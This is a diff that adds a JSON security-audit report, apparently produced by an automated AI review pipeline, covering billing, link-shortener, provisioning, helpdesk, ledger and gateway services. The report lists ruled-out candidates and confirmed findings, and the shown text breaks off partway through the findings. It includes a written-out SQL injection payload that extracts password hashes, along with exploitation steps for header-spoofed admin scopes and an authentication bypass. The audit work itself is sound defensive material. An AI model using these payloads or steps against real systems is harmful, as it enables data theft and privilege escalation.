@@ -1,0 +1,1658 @@
+{
+  "provenance": {
+    "corpus": "google/mantis @ 56377ad via mantis-meta-agent",
+    "target": "/private/tmp/claude-501/-Users-cristianajavi/9d781ed3-bcf0-48ee-982b-aa1d8b6fbd34/scratchpad/corpus-v6",
+    "arm": "mantis",
+    "run": 3,
+    "stages_run": [
+      "mantis-meta-agent (supervisor; MODE-OFF - no --sync, no snapshot pinned, active_snapshot absent per schema.json 3-state model; stages executed inline rather than delegated, per mantis-researcher SKILL.md:181-182 sequential fallback, because the harness caps subagent concurrency)",
+      "mantis-summarize (directory mapping over all 6 top-level components, 59 files / 3662 LOC)",
+      "mantis-architecture (workspace/kb/ + entity and data-flow notes)",
+      "mantis-threat-model (workspace/kb/THREAT_MODEL.md: trust boundaries, attacker profiles, recurring anti-patterns)",
+      "mantis-plan (workspace/plan.json: 6 investigations, one per top-level component)",
+      "mantis-researcher (exhaustive read of every file in the target - no sampling; repo-wide grep sweep for call sites of every suspect symbol)",
+      "mantis-dedupe (merged overlapping claims: enroll+bulk-enroll folded to one finding; attachment download+upload folded to one root-cause finding at the router scope)",
+      "mantis-review (all 13 negative constraints applied adversarially to every candidate; 18 candidates killed - see ruled_out)",
+      "mantis-critic (production-viability pass: 8 findings demoted to status=probable where reachability, framework semantics or an out-of-tree producer could not be established)",
+      "mantis-reproduce (Tier 1 unit micro-harness only: 9 assertions executed offline with node and python3 - SQL string construction, scopesFor default, ENVIRONMENT gate over all 4 configured values, AdminScopeGuard prefix under the global prefix, and 5 sanitizer bypass classes including the removal-based scheme-filter reintroduction)",
+      "mantis-calibrate (severity assigned from impact x evidence x viability)",
+      "mantis-report (this document)"
+    ],
+    "stages_skipped": [
+      "mantis-history - target is not a version-controlled tree (`git rev-parse` fails, no .git/.hg/.repo), so there is no VCS history to mine; workspace/historical_learnings.jsonl left absent and the architecture stage ran without it",
+      "mantis-structural-index - the index is HINT-only by contract and degrades to grep when unavailable; no query_structural_index.py helper ships in the snapshot, no SCIP/Kythe/ctags backend is installed, and the target is 3662 LOC across 59 files, so the mandatory grep floor was itself exhaustive. Index would have decided ORDER, not MEMBERSHIP",
+      "mantis-reproduce Tiers 2-3 (functional subsystem, full sandboxed service) - no runtime for 5 of the 6 components: mix/elixir, go, gradle/kotlinc, envoy and docker are all absent, and the two present runtimes (node, python3) have no installed dependencies (@nestjs, aiohttp, confluent_kafka, pydantic) and no network to fetch them. No finding is therefore claimed as reproduced; all statuses are review/critic confidence",
+      "mantis-chain - deliberately not emitting Super Findings, to keep every reported entry anchored to one code location as the report contract requires. Cross-component chains are recorded inside the evidence and impact of their constituent findings (e.g. edge-links auth bypass + /do/* scope spoofing; mesh-gateway published port + /admin RBAC prefix + handleAdmin + putRaw)",
+      "mantis-patch - the instruction is read-only on the target; no fix was written or applied, and no *.bak-<uuid> file was created",
+      "mantis-reflect - the harness exposes no per-subagent transcript.jsonl paths, and stages ran inline rather than as subagents, so there are no trajectories to parse. Per the meta-agent contract this is recorded as an explicit empty transcript list rather than as zero learnings",
+      "mantis-meta-agent Stage 15 archive/pass-increment - single pass; workspace/findings/ was not rotated into workspace/archive/findings_pass_1/ because no second pass follows"
+    ],
+    "triage_rule_map": "The report contract's FP-nn labels map 1:1, in order, onto the 13 negative constraints of mantis-review SKILL.md section 3: FP-01 ignore_hypothetical_misuse, FP-02 ignore_missing_hygiene, FP-03 require_strict_reproducibility, FP-04 avoid_pedantic_linting, FP-05 no_security_flaw_stretching, FP-06 evaluate_questionable_file_paths, FP-07 ignore_resource_exhaustion_dos, FP-08 intrinsic_security_flaws, FP-09 verify_mitigations_pragmatically, FP-10 refine_code_paths_strictly, FP-11 ignore_simd_vector_padding, FP-12 ensure_source_code_coherence, FP-13 verify_attacker_control_of_source. Answer vocabulary: HOLDS = the disqualifying condition fires (mantis outcome FAIL, i.e. the finding would be a FALSE_POSITIVE); DOES_NOT_HOLD = the constraint is satisfied and does not disqualify (mantis outcome PASS); UNKNOWN and NOT_APPLICABLE carry their mantis meanings. No reported finding carries a HOLDS answer, because mantis-review marks any finding with a FAIL entry as FALSE_POSITIVE and drops it - those 18 appear in ruled_out instead. FP-11 (SIMD/vector padding) is not exercised anywhere: the target contains no vectorised or unmanaged-memory code.",
+    "coverage": "All 6 top-level directories audited. 59 of 59 files read in full (no sampling): billing-portal 10, edge-links 11, fleet-provision 10, helpdesk-live 10, ledger-stream 11, mesh-gateway 8 (includes package.json, wrangler.toml, build.gradle.kts, application.conf, mix.exs, go.mod, docker-compose.yml and envoy.yaml, which carry several of the findings).",
+    "ruled_out": [
+      {
+        "assertion": "JwtMiddleware registered for path 'invoices' leaves nested routes such as /invoices/:id and /invoices/search without session decoding",
+        "location": "billing-portal/src/app.module.ts:32",
+        "rule": "FP-01",
+        "killed_by": "Nest maps forRoutes({method: RequestMethod.ALL}) onto the Express adapter's app.use(path, handler), which is a prefix match, so /invoices/:id and /invoices/search are covered. The claim depended on assuming exact-path semantics that the framework does not use. The related fail-open in tenantFor is reported separately at reduced confidence."
+      },
+      {
+        "assertion": "jwt.decode is called on the bearer token without verification, allowing a forged jti",
+        "location": "billing-portal/src/auth/jwt.middleware.ts:47",
+        "rule": "FP-09",
+        "killed_by": "The same token was verified at line 30 and the request would already have been rejected; decode is used only to lift a correlation id for the access log. The mitigation is real and the comment describes it accurately."
+      },
+      {
+        "assertion": "legacyLookup queries invoices with an empty tenant id, enabling cross-tenant reads",
+        "location": "billing-portal/src/invoices/invoices.service.ts:73",
+        "rule": "FP-01",
+        "killed_by": "Private method, no caller anywhere in the tree (grepped), and tenant_id = '' matches no row in a table whose rows always carry a tenant. Not an intrinsic flaw under rule 08 either."
+      },
+      {
+        "assertion": "CORS is misconfigured because credentials are enabled alongside a configurable origin list",
+        "location": "billing-portal/src/main.ts:15",
+        "rule": "FP-09",
+        "killed_by": "allowedOrigins explicitly filters out '*' (`s !== '*'`) and defaults to a single https origin, so credentials are never paired with a wildcard. The mitigation works as written."
+      },
+      {
+        "assertion": "SSRF in the Open Graph preview endpoint",
+        "location": "edge-links/src/handlers/go.ts:47",
+        "rule": "FP-09",
+        "killed_by": "The handler requires protocol === 'https:' and membership in a closed ALLOWED_PREVIEW_HOSTS set, uses redirect: 'manual' so it will not follow a redirect off the allowlist, and returns only the hostname and a length-bounded title. The mitigation is effective for the claimed class."
+      },
+      {
+        "assertion": "constantTimeEquals returns early on a length mismatch, leaking the workspace secret's length",
+        "location": "edge-links/src/index.ts:20",
+        "rule": "FP-04",
+        "killed_by": "Length disclosure of a high-entropy stored secret is not a directly triggerable flaw, and the byte comparison itself is constant time. This is paranoia about an otherwise-correct primitive."
+      },
+      {
+        "assertion": "The KV rate limiter's read-modify-write is racy, so a client can exceed MAX_PER_WINDOW",
+        "location": "edge-links/src/ratelimit.ts:30",
+        "rule": "FP-07",
+        "killed_by": "Rule 07: a request-budget module is not a DoS-defence primitive whose stated purpose is to withstand this, and the impact is bounded to exceeding a soft quota."
+      },
+      {
+        "assertion": "Path traversal in the settlement backfill's resolve_export",
+        "location": "ledger-stream/admin/backfill.py:29",
+        "rule": "FP-09",
+        "killed_by": "candidate is fully resolved with Path.resolve() before the check, and `root not in candidate.parents` rejects both ../ escapes and symlinks pointing outside the drop root (resolve follows them first). The containment check is correct as written."
+      },
+      {
+        "assertion": "_compare_tokens_naive is a non-constant-time comparison usable as a timing side channel",
+        "location": "ledger-stream/common/signing.py:27",
+        "rule": "FP-01",
+        "killed_by": "No caller anywhere in the tree (grepped); the module's live path uses hmac.compare_digest at line 22. Rule 08's no-caller exemption does not apply: a plain string comparison helper is not a broken cryptographic primitive or a hardcoded secret."
+      },
+      {
+        "assertion": "The health endpoint sets Access-Control-Allow-Origin: *",
+        "location": "ledger-stream/api/app.py:96",
+        "rule": "FP-02",
+        "killed_by": "Rule 02: the response contains only {'status': 'ok'} and nothing account-scoped; the comment documents the cross-origin status page that requires it."
+      },
+      {
+        "assertion": "The intake service reads request['org_id'] from an auth middleware that build_app never installs, so org scoping is absent",
+        "location": "ledger-stream/api/app.py:43",
+        "rule": "FP-03",
+        "killed_by": "build_app does indeed install no middleware, but aiohttp raises KeyError on the missing key, producing a 500 before anything is published. The behaviour fails closed, so there is no triggerable security flaw - it is a deployment/wiring defect."
+      },
+      {
+        "assertion": "Policy.can_read?/2 returns true for any ticket when the agent is an auditor, permitting cross-org reads",
+        "location": "helpdesk-live/lib/helpdesk/policy.ex:30",
+        "rule": "FP-01",
+        "killed_by": "can_read?/2 has no caller anywhere in the tree (grepped). The read path enforces scope through Policy.org_scope/1 -> Tickets.apply_scope/2, which narrows auditors to {:tenancy_of, org}. The genuine cross-org read on this surface is the unscoped cache key, reported separately."
+      },
+      {
+        "assertion": "The note body is re-emitted into a textarea, allowing tag breakout",
+        "location": "helpdesk-live/lib/helpdesk_web/live/ticket_live.html.heex:27",
+        "rule": "FP-09",
+        "killed_by": "That interpolation uses <%= %> without raw/1, so HEEx escapes it and </textarea> becomes &lt;/textarea&gt;. The two unescaped sinks (lines 12 and 18) are reported under the sanitizer finding."
+      },
+      {
+        "assertion": "requireMutualTls compares environment against 'prod' while application.conf sets 'production', so the mTLS requirement never engages in production",
+        "location": "fleet-provision/src/main/kotlin/com/fleet/Config.kt:26",
+        "rule": "FP-01",
+        "killed_by": "The string mismatch is real, but grepping the whole tree shows the property has no consumer - nothing reads config.requireMutualTls. With no reachable effect there is no triggerable flaw today. Worth fixing as latent config debt; the same mismatch pattern IS live in edge-links/src/auth.ts:50 and is reported there."
+      },
+      {
+        "assertion": "The debug echo route reflects all request headers, leaking Authorization",
+        "location": "fleet-provision/src/main/kotlin/com/fleet/routes/Devices.kt:117",
+        "rule": "FP-09",
+        "killed_by": "Registration is gated on config.debugRoutesEnabled, which is environment == \"dev\"; application.conf ships environment = \"production\". The gate is effective for its stated purpose."
+      },
+      {
+        "assertion": "The object key taken from the URL path reaches the filesystem, permitting traversal out of OBJECT_ROOT",
+        "location": "mesh-gateway/service/main.go:54",
+        "rule": "FP-09",
+        "killed_by": "pathFor hashes tenant+key with SHA-256 and uses only the hex digest as the filename (store.go:44-48), so no caller-controlled byte reaches the path. The comment describing this as the reason is accurate."
+      },
+      {
+        "assertion": "The Envoy admin interface is exposed",
+        "location": "mesh-gateway/envoy/envoy.yaml:3",
+        "rule": "FP-02",
+        "killed_by": "It is bound to 127.0.0.1:9901 and docker-compose publishes only 8080 for the edge container, so it is not reachable off-host. Rule 02 hygiene."
+      },
+      {
+        "assertion": "/internal/stats discloses the object root path and the tenant quota",
+        "location": "mesh-gateway/service/main.go:119",
+        "rule": "FP-02",
+        "killed_by": "Rule 02: a filesystem path and a configured quota are low-value configuration details, not credentials or tenant data. The exposure of the /internal group as a whole is reported under the published-port and internal-routes findings."
+      }
+    ]
+  },
+  "findings": [
+    {
+      "title": "Raw SQL string interpolation of the search term in searchByMemo",
+      "location": {
+        "path": "billing-portal/src/invoices/invoice.repository.ts",
+        "symbol": "InvoiceRepository.searchByMemo",
+        "line": 51
+      },
+      "class": "SQL injection",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "db.raw() parameterises tenant_id with a placeholder but splices the caller's term straight into the statement: `and memo ilike '%${term}%'`. term is the raw `q` query-string value from invoices.controller.ts:61-62 (`@Get('search') search(@Req() req, @Query('q') q = '')`), passed through with no escaping, quoting or length bound. Micro-harness: the template literal with q=\"%' union all select id, email, 0, password_hash from users --\" produces a statement containing the attacker's UNION clause outside any quoted literal. Note also that the injected text sits before the parameter binding, so knex still binds tenant_id but the query shape is already attacker-chosen.",
+      "impact": "Any authenticated portal user can read or modify arbitrary rows in the billing database - other tenants' invoices, and any other table reachable by the pg role in DATABASE_URL - via GET /api/v1/invoices/search?q=. The tenant_id binding on the same statement provides no protection because the injection point is a separate predicate that can be terminated and followed by UNION/OR.",
+      "recommendation": "Bind the term: `and memo ilike ?` with `['%' + term + '%']`, or use the knex query builder (`.whereILike('memo', `%${term}%`)`). Escape LIKE metacharacters (% and _) in the term separately.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). invoice.repository.ts:47-55 exists and contains the quoted interpolation verbatim; searchByMemo is called at invoices.controller.ts:62."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: invoices.controller.ts:61 `@Query('q') q = ''` - an unmodified HTTP query-string value flowing to the sink with no intermediate validation."
+        },
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 4 (avoid_pedantic_linting); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is not paranoia about a safe library: the file uses parameterised knex everywhere else and drops to raw interpolation only here."
+        }
+      ]
+    },
+    {
+      "title": "Staff-only path check is written without the global route prefix, so AdminScopeGuard never fires",
+      "location": {
+        "path": "billing-portal/src/auth/admin-scope.guard.ts",
+        "symbol": "isStaffPath",
+        "line": 15
+      },
+      "class": "Broken access control",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "STAFF_PREFIXES are '/admin', '/internal', '/ops' and the guard returns true (allow, nothing to assert) for any path that does not start with one of them. main.ts:23 calls app.setGlobalPrefix('api/v1'), so AdminReportsController (@Controller('admin/reports')) is served at /api/v1/admin/reports and req.path is '/api/v1/admin/reports'. Micro-harness: isStaffPath('/admin/reports')=true, isStaffPath('/api/v1/admin/reports')=false. The `user.staff !== true -> ForbiddenException` branch at lines 29-32 is therefore dead for every route the application actually exposes.",
+      "impact": "The entire staff surface is served to ordinary tenant sessions. Concretely, GET /api/v1/admin/reports, PATCH /api/v1/admin/reports/:id and DELETE /api/v1/admin/reports/:id carry no @Roles metadata either, so RolesGuard also short-circuits (roles.guard.ts:25-27) and any user holding a valid session JWT reaches them. The two POST routes are still gated by @Roles('billing_ops').",
+      "recommendation": "Do not pattern-match on the raw request path. Either mark staff controllers with a decorator (@Staff()) that the guard reads via Reflector, or build the prefix list from the configured global prefix. Add a startup assertion that every controller under a staff prefix is covered by the guard.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Both halves verified: STAFF_PREFIXES at admin-scope.guard.ts:12, setGlobalPrefix at main.ts:23, AdminReportsController at invoices.controller.ts:81."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Not a missing header or a local-only test hook: this is the sole authorisation control on the staff surface and it is unreachable."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the HTTP request path itself (req.path at admin-scope.guard.ts:22) plus the session JWT's `staff` claim; the caller chooses the path."
+        }
+      ]
+    },
+    {
+      "title": "Admin report mutations carry no @Roles metadata, so RolesGuard allows every session",
+      "location": {
+        "path": "billing-portal/src/invoices/invoices.controller.ts",
+        "symbol": "AdminReportsController.updateDefinition",
+        "line": 96
+      },
+      "class": "Missing authorization",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "RolesGuard returns true whenever the handler has no ROLES_KEY metadata (roles.guard.ts:25-27). createDefinition (line 90) and reconcile (line 107) declare @Roles('billing_ops'); listDefinitions (85), updateDefinition (96) and deleteDefinition (101) declare nothing. The only remaining control on those three is AdminScopeGuard, which is itself inert (see the global-prefix finding).",
+      "impact": "A tenant user with any valid session can enumerate, rewrite and delete the reporting definitions the operations team relies on. On its own this is an escalation from billing_ops to any-authenticated-user; combined with the AdminScopeGuard prefix defect it is an escalation from staff-only to any tenant.",
+      "recommendation": "Apply @Roles('billing_ops') to every handler on AdminReportsController, or set the metadata at class level with @Roles on the controller. Consider making RolesGuard fail closed for controllers under a staff prefix when no metadata is present.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Decorator presence/absence read directly at invoices.controller.ts:85-104; RolesGuard's no-metadata branch at roles.guard.ts:25."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Missing authorisation on a mutating operator endpoint is an access-control defect, not defence-in-depth."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: the HTTP request and its session JWT roles claim (jwt.middleware.ts:41); the caller controls which roles the token carries only insofar as the IdP issues them, but no role at all is required here."
+        }
+      ]
+    },
+    {
+      "title": "Invoice detail cache is keyed on invoice id alone, so entries cross the tenant boundary",
+      "location": {
+        "path": "billing-portal/src/invoices/invoices.service.ts",
+        "symbol": "InvoicesService.get",
+        "line": 28
+      },
+      "class": "Cross-tenant data exposure",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "`this.cache.wrap(`invoice:${invoiceId}`, () => this.repo.findForTenant(tenantId, invoiceId))`. The key omits tenantId while the loader is the only thing that applies the tenant filter, and TtlCache.wrap (common/cache.ts:16-24) returns the stored value without re-running the loader on a hit. The cache is a process-local Map shared by every request the replica serves, with a 30s TTL.",
+      "impact": "Once tenant A has fetched invoice X, any request for the same invoice id from tenant B within 30 seconds returns tenant A's row - the where({tenant_id}) clause is never evaluated. The inverse also holds: tenant B's miss caches `undefined` under the same key and denies the legitimate owner for the rest of the TTL. changeStatus invalidates the same unscoped key, so the defect is consistent rather than accidental.",
+      "recommendation": "Include the tenant in the key: `invoice:${tenantId}:${invoiceId}` (and update the invalidate call in changeStatus to match). Better, make TtlCache take a required scope argument so an unscoped key cannot be constructed.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Key expression at invoices.service.ts:28, hit path at common/cache.ts:17-20, invalidation at invoices.service.ts:55."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `@Param('id') id` at invoices.controller.ts:66 - the attacker supplies the invoice id that becomes the whole cache key."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The defect is in this function's own key construction, not in a hypothetical caller passing a bad parameter."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). No timing subtlety: the second request simply hits the map. Any two requests inside the 30s TTL trigger it deterministically."
+        }
+      ]
+    },
+    {
+      "title": "Reconciliation bulk upsert accepts caller-chosen ids and merges status, bypassing tenant scoping and the invoice state machine",
+      "location": {
+        "path": "billing-portal/src/invoices/invoice.repository.ts",
+        "symbol": "InvoiceRepository.bulkUpsert",
+        "line": 81
+      },
+      "class": "Broken access control / business logic bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "bulkUpsert inserts caller-supplied `Partial<InvoiceRow>[]` with `.onConflict('id').merge(['status', 'amount_cents', 'memo', 'updated_at'])` and no tenant predicate. The rows arrive from AdminReportsController.reconcile (invoices.controller.ts:109-110, `body.rows ?? []`) via InvoicesService.importReconciled (invoices.service.ts:67-69). `@Body() body: any` means the global ValidationPipe({whitelist:true}) has no DTO metadata to strip against, so every column in the row object survives. ALLOWED_TRANSITIONS (invoices.service.ts:14-19), which the file's own comment says the general ledger export depends on, is never consulted on this path.",
+      "impact": "A caller holding billing_ops in any tenant can overwrite the status, amount and memo of any invoice in any other tenant by supplying its id, and can move a `paid` invoice back to `open` - the exact transition the code documents as forbidden because the GL export relies on it. Financial-record integrity and tenant isolation both fail on one request.",
+      "recommendation": "Type the endpoint with a DTO so ValidationPipe whitelists it; scope the upsert with `.where({tenant_id: tenantId})` (or make the conflict target (tenant_id, id)); and route status changes through changeStatus so ALLOWED_TRANSITIONS applies to the batch path too.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Chain verified end to end: controller:109 -> service:67 -> repository:78-83; ALLOWED_TRANSITIONS at service:14."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Ingress cited: `@Body() body: any` at invoices.controller.ts:109; body.rows reaches knex.insert unmodified."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). bulkUpsert is not a safe primitive being misused - it is documented as the reconciliation entry point and is wired to an HTTP handler."
+        }
+      ]
+    },
+    {
+      "title": "tenantFor falls open to a client-supplied tenant selector when no session is present",
+      "location": {
+        "path": "billing-portal/src/invoices/invoices.controller.ts",
+        "symbol": "tenantFor",
+        "line": 30
+      },
+      "class": "Fail-open authorization",
+      "severity": "medium",
+      "status": "probable",
+      "evidence": "`if (!session) { return requested ?? DEFAULT_TENANT; }`. When req.user is absent the function honours the `?tenant=` query parameter (invoices.controller.ts:66) or silently substitutes the hardcoded 'acme', and the caller then treats the result as an authorised tenant scope. Nothing in the request path re-checks that a session existed: neither AdminScopeGuard (which returns true for non-staff paths) nor RolesGuard (which returns true when no @Roles metadata is present) requires a principal. The only thing standing between this branch and cross-tenant reads is the hand-maintained route list in app.module.ts:31-34.",
+      "impact": "Any request that reaches a controller without JwtMiddleware having run selects its own tenant. Today that list covers 'invoices' and 'admin/*', so the branch is not reachable through the shipped routes; a new controller, a renamed path, or a change to the middleware registration turns it into unauthenticated cross-tenant read/write on GET/PATCH/DELETE /invoices/:id.",
+      "recommendation": "Delete the fallback. If a request has no session, throw UnauthorizedException. If an internal mesh caller genuinely needs to select a tenant, give it its own controller behind an explicit service-identity guard rather than an implicit `!req.user` branch.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Branch present verbatim at invoices.controller.ts:27-31; DEFAULT_TENANT at line 17."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 1 (ignore_hypothetical_misuse); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The unsafe decision is made inside tenantFor itself; it is not a caller passing an invalid parameter to an otherwise safe function."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Reachability is not proven: Nest maps forRoutes({method: RequestMethod.ALL}) to Express app.use(path), a prefix match, so the current route set appears to be fully covered by JwtMiddleware. Reported as a fail-open primitive rather than a triggerable bypass; status set to probable for exactly this reason."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "UNKNOWN",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). The `requested` value is attacker-controlled (`@Query('tenant')`, line 66), but no ingress that reaches this branch with req.user unset could be demonstrated in the current configuration."
+        }
+      ]
+    },
+    {
+      "title": "Authentication is skipped whenever ENVIRONMENT is not the exact string \"production\", which the production config never sets",
+      "location": {
+        "path": "edge-links/src/auth.ts",
+        "symbol": "authenticate",
+        "line": 50
+      },
+      "class": "Authentication bypass",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "authenticate() opens with `if (env.ENVIRONMENT !== \"production\") return {sub:'dashboard', owner:'dashboard', role:'owner', scopes: SCOPES_ALL};` - it returns a fully privileged session without reading the Authorization header at all. wrangler.toml declares ENVIRONMENT = \"dev\" at [vars] (line 7), \"staging\" for [env.staging] (line 36) and \"prod\" - not \"production\" - for [env.production] (line 40). Micro-harness over the four configured values: dev/staging/prod all take the bypass branch; only the string \"production\", which no deployment sets, takes the verification path.",
+      "impact": "Every deployment of this Worker, including edge-links-prod, serves every request as an owner-scoped session for the 'dashboard' workspace with SCOPES_ALL (links:read/write/delete/admin). Unauthenticated callers can list, create and delete links and reach the Durable Object surface. TOKEN_SIGNING_KEY and the HMAC verification below are never exercised.",
+      "recommendation": "Invert the gate to fail closed: require an explicit opt-out flag (e.g. env.ALLOW_ANONYMOUS_DASHBOARD === 'true') that production cannot set, and never derive a privileged principal from an environment name. Add a boot-time assertion that the deployed ENVIRONMENT value is one of a known enum.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). auth.ts:50-52 and wrangler.toml:7/36/40 both read directly; SCOPES_ALL resolves to ROLE_SCOPES.owner at roles.ts:8."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 13 (verify_attacker_control_of_source); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). No taint needed: the bypass is unconditional on the deployed configuration. Ingress is any HTTP request to the Worker (index.ts:94)."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 2 (ignore_missing_hygiene); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). This is the authentication function itself, not a missing header or a local-only test affordance."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 3 (require_strict_reproducibility); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). Deterministic: a single unauthenticated GET /api/links returns a rendered list."
+        }
+      ]
+    },
+    {
+      "title": "/do/* forwards the client's request verbatim to the Durable Object, letting callers set their own X-Actor-Scopes",
+      "location": {
+        "path": "edge-links/src/index.ts",
+        "symbol": "default.fetch",
+        "line": 105
+      },
+      "class": "Privilege escalation",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "LinkStore derives the caller's capabilities solely from the X-Actor-Scopes request header (do/LinkStore.ts:14-19), and its own comment says 'Scopes are stamped on by the router once it has authenticated the caller'. The /do/* branch builds `new Request(url, request)` - the second argument copies the original client request's headers - and hands it to stub.fetch() unchanged, so any header the client sent survives. The authenticated createLink path (handlers/links.ts:76) and the /api/links GET path (index.ts:118) do stamp the header from the session, which confirms the header is meant to be router-controlled.",
+      "impact": "A session holding only the viewer role (scopes: ['links:read']) can POST /do/put or /do/delete with `X-Actor-Scopes: links:admin` and pass every check in LinkStore.put/list/delete. Chained with the environment-gate bypass above, an unauthenticated caller reaches the same surface. /do/* is also outside LIMITED_PREFIXES (ratelimit.ts:9), so it is unmetered.",
+      "recommendation": "Strip and re-stamp identity headers on the forwarded request: build a fresh Headers object from the session rather than cloning the client's, e.g. `new Request(url, {method, body, headers: {'X-Actor-Scopes': session.scopes.join(',')}})`. Better, pass the scopes out-of-band (RPC method arguments) so a header can never carry authority.",
+      "triage": [
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "mantis-review negative constraint 12 (ensure_source_code_coherence); answer HOLDS = the disqualifying condition fires (mantis FAIL), DOES_NOT_HOLD = constraint satisfied (mantis PASS). index.ts:104-109 and do/LinkStore.ts:14-19 verified; the two legitimate stamping sites at links.ts:76 and index.ts:118 confirm the intended direction."
+        },
+        {
